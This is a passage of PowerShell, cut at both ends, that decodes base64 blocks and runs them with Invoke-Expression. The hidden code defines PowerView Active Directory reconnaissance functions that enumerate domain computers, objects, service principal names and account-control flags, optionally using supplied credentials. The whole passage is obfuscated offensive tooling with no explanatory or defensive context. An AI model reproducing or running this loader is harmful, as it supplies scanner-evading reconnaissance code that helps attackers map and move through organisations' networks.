SAnW0dldC1Eb21haW5Db21wdXRlcl0gU2VhcmNoaW5nIGZvciBwcmludGVycycKICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gJyhvYmplY3RDYXRlZ29yeT1wcmludFF1ZXVlKScKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTUE4nXSkgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5Db21wdXRlcl0gU2VhcmNoaW5nIGZvciBjb21wdXRlcnMgd2l0aCBTUE46ICRTUE4iCiAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIoc2VydmljZVByaW5jaXBhbE5hbWU9JFNQTikiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snT3BlcmF0aW5nU3lzdGVtJ10pIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluQ29tcHV0ZXJdIFNlYXJjaGluZyBmb3IgY29tcHV0ZXJzIHdpdGggb3BlcmF0aW5nIHN5c3RlbTogJE9wZXJhdGluZ1N5c3RlbSIKICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gIihvcGVyYXRpbmdzeXN0ZW09JE9wZXJhdGluZ1N5c3RlbSkiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmljZVBhY2snXSkgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5Db21wdXRlcl0gU2VhcmNoaW5nIGZvciBjb21wdXRlcnMgd2l0aCBzZXJ2aWNlIHBhY2s6ICRTZXJ2aWNlUGFjayIKICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gIihvcGVyYXRpbmdzeXN0ZW1zZXJ2aWNlcGFjaz0kU2VydmljZVBhY2spIgogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NpdGVOYW1lJ10pIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluQ29tcHV0ZXJdIFNlYXJjaGluZyBmb3IgY29tcHV0ZXJzIHdpdGggc2l0ZSBuYW1lOiAkU2l0ZU5hbWUiCiAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIoc2VydmVycmVmZXJlbmNlYmw9JFNpdGVOYW1lKSIKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydMREFQRmlsdGVyJ10pIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluQ29tcHV0ZXJdIFVzaW5nIGFkZGl0aW9uYWwgTERBUCBmaWx0ZXI6ICRMREFQRmlsdGVyIgogICAgICAgICAgICAgICAgJEZpbHRlciArPSAiJExEQVBGaWx0ZXIiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJFVBQ0ZpbHRlciB8IFdoZXJlLU9iamVjdCB7JF99IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgaWYgKCRfIC1tYXRjaCAnTk9UXy4qJykgewogICAgICAgICAgICAgICAgICAgICRVQUNGaWVsZCA9ICRfLlN1YnN0cmluZyg0KQogICAgICAgICAgICAgICAgICAgICRVQUNWYWx1ZSA9IFtJbnRdKCRVQUNFbnVtOjokVUFDRmllbGQpCiAgICAgICAgICAgICAgICAgICAgJEZpbHRlciArPSAiKCEodXNlckFjY291bnRDb250cm9sOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PSRVQUNWYWx1ZSkpIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJFVBQ1ZhbHVlID0gW0ludF0oJFVBQ0VudW06OiRfKQogICAgICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gIih1c2VyQWNjb3VudENvbnRyb2w6MS4yLjg0MC4xMTM1NTYuMS40LjgwMzo9JFVBQ1ZhbHVlKSIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAkQ29tcFNlYXJjaGVyLmZpbHRlciA9ICIoJihzYW1BY2NvdW50VHlwZT04MDUzMDYzNjkpJEZpbHRlcikiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluQ29tcHV0ZXJdIEdldC1Eb21haW5Db21wdXRlciBmaWx0ZXIgc3RyaW5nOiAkKCRDb21wU2VhcmNoZXIuZmlsdGVyKSIKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRmluZE9uZSddKSB7ICRSZXN1bHRzID0gJENvbXBTZWFyY2hlci5GaW5kT25lKCkgfQogICAgICAgICAgICBlbHNlIHsgJFJlc3VsdHMgPSAkQ29tcFNlYXJjaGVyLkZpbmRBbGwoKSB9CiAgICAgICAgICAgICRSZXN1bHRzIHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAkVXAgPSAkVHJ1ZQogICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUGluZyddKSB7CiAgICAgICAgICAgICAgICAgICAgJFVwID0gVGVzdC1Db25uZWN0aW9uIC1Db3VudCAxIC1RdWlldCAtQ29tcHV0ZXJOYW1lICRfLnByb3BlcnRpZXMuZG5zaG9zdG5hbWUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICgkVXApIHsKICAgICAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSYXcnXSkgewogICAgICAgICAgICAgICAgICAgICAgICAkQ29tcHV0ZXIgPSAkXwogICAgICAgICAgICAgICAgICAgICAgICAkQ29tcHV0ZXIuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkNvbXB1dGVyLlJhdycpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAkQ29tcHV0ZXIgPSBDb252ZXJ0LUxEQVBQcm9wZXJ0eSAtUHJvcGVydGllcyAkXy5Qcm9wZXJ0aWVzCiAgICAgICAgICAgICAgICAgICAgICAgICRDb21wdXRlci5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuQ29tcHV0ZXInKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkQ29tcHV0ZXIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFJlc3VsdHMpIHsKICAgICAgICAgICAgICAgIHRyeSB7ICRSZXN1bHRzLmRpc3Bvc2UoKSB9CiAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5Db21wdXRlcl0gRXJyb3IgZGlzcG9zaW5nIG9mIHRoZSBSZXN1bHRzIG9iamVjdDogJF8iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJENvbXBTZWFyY2hlci5kaXNwb3NlKCkKICAgICAgICB9CiAgICB9Cn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpbk9iamVjdCB7CiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNVc2VEZWNsYXJlZFZhcnNNb3JlVGhhbkFzc2lnbm1lbnRzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5BRE9iamVjdCcpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5BRE9iamVjdC5SYXcnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0Rpc3Rpbmd1aXNoZWROYW1lJywgJ1NhbUFjY291bnROYW1lJywgJ05hbWUnLCAnTWVtYmVyRGlzdGluZ3Vpc2hlZE5hbWUnLCAnTWVtYmVyTmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkSWRlbnRpdHksCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0ZpbHRlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJExEQVBGaWx0ZXIsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFByb3BlcnRpZXMsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0FEU1BhdGgnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hCYXNlLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdEYWNsJywgJ0dyb3VwJywgJ05vbmUnLCAnT3duZXInLCAnU2FjbCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlY3VyaXR5TWFza3MsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAogICAgICAgIFtBbGlhcygnUmV0dXJuT25lJyldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkRmluZE9uZSwKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHksCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkUmF3CiAgICApCiAgICBEeW5hbWljUGFyYW0gewogICAgICAgICRVQUNWYWx1ZU5hbWVzID0gW0VudW1dOjpHZXROYW1lcygkVUFDRW51bSkKICAgICAgICAkVUFDVmFsdWVOYW1lcyA9ICRVQUNWYWx1ZU5hbWVzIHwgRm9yRWFjaC1PYmplY3QgeyRfOyAiTk9UXyRfIn0KICAgICAgICBOZXctRHluYW1pY1BhcmFtZXRlciAtTmFtZSBVQUNGaWx0ZXIgLVZhbGlkYXRlU2V0ICRVQUNWYWx1ZU5hbWVzIC1UeXBlIChbYXJyYXldKQogICAgfQogICAgQkVHSU4gewogICAgICAgICRTZWFyY2hlckFyZ3VtZW50cyA9IEB7fQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydQcm9wZXJ0aWVzJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydQcm9wZXJ0aWVzJ10gPSAkUHJvcGVydGllcyB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoQmFzZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJFNlYXJjaEJhc2UgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWN1cml0eU1hc2tzJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWN1cml0eU1hc2tzJ10gPSAkU2VjdXJpdHlNYXNrcyB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAkT2JqZWN0U2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgQFNlYXJjaGVyQXJndW1lbnRzCiAgICB9CiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzIC1hbmQgKCRQU0JvdW5kUGFyYW1ldGVycy5Db3VudCAtbmUgMCkpIHsKICAgICAgICAgICAgTmV3LUR5bmFtaWNQYXJhbWV0ZXIgLUNyZWF0ZVZhcmlhYmxlcyAtQm91bmRQYXJhbWV0ZXJzICRQU0JvdW5kUGFyYW1ldGVycwogICAgICAgIH0KICAgICAgICBpZiAoJE9iamVjdFNlYXJjaGVyKSB7CiAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciA9ICcnCiAgICAgICAgICAgICRGaWx0ZXIgPSAnJwogICAgICAgICAgICAkSWRlbnRpdHkgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICRJZGVudGl0eUluc3RhbmNlID0gJF8uUmVwbGFjZSgnKCcsICdcMjgnKS5SZXBsYWNlKCcpJywgJ1wyOScpCiAgICAgICAgICAgICAgICBpZiAoJElkZW50aXR5SW5zdGFuY2UgLW1hdGNoICdeUy0xLScpIHsKICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIihvYmplY3RzaWQ9JElkZW50aXR5SW5zdGFuY2UpIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZWlmICgkSWRlbnRpdHlJbnN0YW5jZSAtbWF0Y2ggJ14oQ058T1V8REMpPScpIHsKICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIihkaXN0aW5ndWlzaGVkbmFtZT0kSWRlbnRpdHlJbnN0YW5jZSkiCiAgICAgICAgICAgICAgICAgICAgaWYgKCgtbm90ICRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIC1hbmQgKC1ub3QgJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eURvbWFpbiA9ICRJZGVudGl0eUluc3RhbmNlLlN1YlN0cmluZygkSWRlbnRpdHlJbnN0YW5jZS5JbmRleE9mKCdEQz0nKSkgLXJlcGxhY2UgJ0RDPScsJycgLXJlcGxhY2UgJywnLCcuJwogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbk9iamVjdF0gRXh0cmFjdGVkIGRvbWFpbiAnJElkZW50aXR5RG9tYWluJyBmcm9tICckSWRlbnRpdHlJbnN0YW5jZSciCiAgICAgICAgICAgICAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkSWRlbnRpdHlEb21haW4KICAgICAgICAgICAgICAgICAgICAgICAgJE9iamVjdFNlYXJjaGVyID0gR2V0LURvbWFpblNlYXJjaGVyIEBTZWFyY2hlckFyZ3VtZW50cwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoLW5vdCAkT2JqZWN0U2VhcmNoZXIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtRG9tYWluT2JqZWN0XSBVbmFibGUgdG8gcmV0cmlldmUgZG9tYWluIHNlYXJjaGVyIGZvciAnJElkZW50aXR5RG9tYWluJyIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2VpZiAoJElkZW50aXR5SW5zdGFuY2UgLWltYXRjaCAnXlswLTlBLUZdezh9LShbMC05QS1GXXs0fS0pezN9WzAtOUEtRl17MTJ9JCcpIHsKICAgICAgICAgICAgICAgICAgICAkR3VpZEJ5dGVTdHJpbmcgPSAoKFtHdWlkXSRJZGVudGl0eUluc3RhbmNlKS5Ub0J5dGVBcnJheSgpIHwgRm9yRWFjaC1PYmplY3QgeyAnXCcgKyAkXy5Ub1N0cmluZygnWDInKSB9KSAtam9pbiAnJwogICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKG9iamVjdGd1aWQ9JEd1aWRCeXRlU3RyaW5nKSIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2VpZiAoJElkZW50aXR5SW5zdGFuY2UuQ29udGFpbnMoJ1wnKSkgewogICAgICAgICAgICAgICAgICAgICRDb252ZXJ0ZWRJZGVudGl0eUluc3RhbmNlID0gJElkZW50aXR5SW5zdGFuY2UuUmVwbGFjZSgnXDI4JywgJygnKS5SZXBsYWNlKCdcMjknLCAnKScpIHwgQ29udmVydC1BRE5hbWUgLU91dHB1dFR5cGUgQ2Fub25pY2FsCiAgICAgICAgICAgICAgICAgICAgaWYgKCRDb252ZXJ0ZWRJZGVudGl0eUluc3RhbmNlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRPYmplY3REb21haW4gPSAkQ29udmVydGVkSWRlbnRpdHlJbnN0YW5jZS5TdWJTdHJpbmcoMCwgJENvbnZlcnRlZElkZW50aXR5SW5zdGFuY2UuSW5kZXhPZignLycpKQogICAgICAgICAgICAgICAgICAgICAgICAkT2JqZWN0TmFtZSA9ICRJZGVudGl0eUluc3RhbmNlLlNwbGl0KCdcJylbMV0KICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIoc2FtQWNjb3VudE5hbWU9JE9iamVjdE5hbWUpIgogICAgICAgICAgICAgICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJE9iamVjdERvbWFpbgogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbk9iamVjdF0gRXh0cmFjdGVkIGRvbWFpbiAnJE9iamVjdERvbWFpbicgZnJvbSAnJElkZW50aXR5SW5zdGFuY2UnIgogICAgICAgICAgICAgICAgICAgICAgICAkT2JqZWN0U2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgQFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZWlmICgkSWRlbnRpdHlJbnN0YW5jZS5Db250YWlucygnLicpKSB7CiAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIofChzYW1BY2NvdW50TmFtZT0kSWRlbnRpdHlJbnN0YW5jZSkobmFtZT0kSWRlbnRpdHlJbnN0YW5jZSkoZG5zaG9zdG5hbWU9JElkZW50aXR5SW5zdGFuY2UpKSIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKHwoc2FtQWNjb3VudE5hbWU9JElkZW50aXR5SW5zdGFuY2UpKG5hbWU9JElkZW50aXR5SW5zdGFuY2UpKGRpc3BsYXluYW1lPSRJZGVudGl0eUluc3RhbmNlKSkiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRJZGVudGl0eUZpbHRlciAtYW5kICgkSWRlbnRpdHlGaWx0ZXIuVHJpbSgpIC1uZSAnJykgKSB7CiAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIofCRJZGVudGl0eUZpbHRlcikiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snTERBUEZpbHRlciddKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbk9iamVjdF0gVXNpbmcgYWRkaXRpb25hbCBMREFQIGZpbHRlcjogJExEQVBGaWx0ZXIiCiAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIkTERBUEZpbHRlciIKICAgICAgICAgICAgfQogICAgICAgICAgICAkVUFDRmlsdGVyIHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICBpZiAoJF8gLW1hdGNoICdOT1RfLionKSB7CiAgICAgICAgICAgICAgICAgICAgJFVBQ0ZpZWxkID0gJF8uU3Vic3RyaW5nKDQpCiAgICAgICAgICAgICAgICAgICAgJFVBQ1ZhbHVlID0gW0ludF0oJFVBQ0VudW06OiRVQUNGaWVsZCkKICAgICAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIoISh1c2VyQWNjb3VudENvbnRyb2w6MS4yLjg0MC4xMTM1NTYuMS40LjgwMzo9JFVBQ1ZhbHVlKSkiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkVUFDVmFsdWUgPSBbSW50XSgkVUFDRW51bTo6JF8pCiAgICAgICAgICAgICAgICAgICAgJEZpbHRlciArPSAiKHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj0kVUFDVmFsdWUpIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkRmlsdGVyIC1hbmQgJEZpbHRlciAtbmUgJycpIHsKICAgICAgICAgICAgICAgICRPYmplY3RTZWFyY2hlci5maWx0ZXIgPSAiKCYkRmlsdGVyKSIKICAgICAgICAgICAgfQogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbk9iamVjdF0gR2V0LURvbWFpbk9iamVjdCBmaWx0ZXIgc3RyaW5nOiAkKCRPYmplY3RTZWFyY2hlci5maWx0ZXIpIgogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydGaW5kT25lJ10pIHsgJFJlc3VsdHMgPSAkT2JqZWN0U2VhcmNoZXIuRmluZE9uZSgpIH0KICAgICAgICAgICAgZWxzZSB7ICRSZXN1bHRzID0gJE9iamVjdFNlYXJjaGVyLkZpbmRBbGwoKSB9CiAgICAgICAgICAgICRSZXN1bHRzIHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSYXcnXSkgewogICAgICAgICAgICAgICAgICAgICRPYmplY3QgPSAkXwogICAgICAgICAgICAgICAgICAgICRPYmplY3QuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkFET2JqZWN0LlJhdycpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkT2JqZWN0ID0gQ29udmVydC1MREFQUHJvcGVydHkgLVByb3BlcnRpZXMgJF8uUHJvcGVydGllcwogICAgICAgICAgICAgICAgICAgICRPYmplY3QuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkFET2JqZWN0JykKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRPYmplY3QKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFJlc3VsdHMpIHsKICAgICAgICAgICAgICAgIHRyeSB7ICRSZXN1bHRzLmRpc3Bvc2UoKSB9CiAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5PYmplY3RdIEVycm9yIGRpc3Bvc2luZyBvZiB0aGUgUmVzdWx0cyBvYmplY3Q6ICRfIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgICRPYmplY3RTZWFyY2hlci5kaXNwb3NlKCkKICAgICAgICB9CiAgICB9Cn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpbk9iamVjdEF0dHJpYnV0ZUhpc3RvcnkgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTVXNlRGVjbGFyZWRWYXJzTW9yZVRoYW5Bc3NpZ25tZW50cycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuQURPYmplY3RBdHRyaWJ1dGVIaXN0b3J5JyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdEaXN0aW5ndWlzaGVkTmFtZScsICdTYW1BY2NvdW50TmFtZScsICdOYW1lJywgJ01lbWJlckRpc3Rpbmd1aXNoZWROYW1lJywgJ01lbWJlck5hbWUnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJElkZW50aXR5LAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdGaWx0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRMREFQRmlsdGVyLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRQcm9wZXJ0aWVzLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdBRFNQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoQmFzZSwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9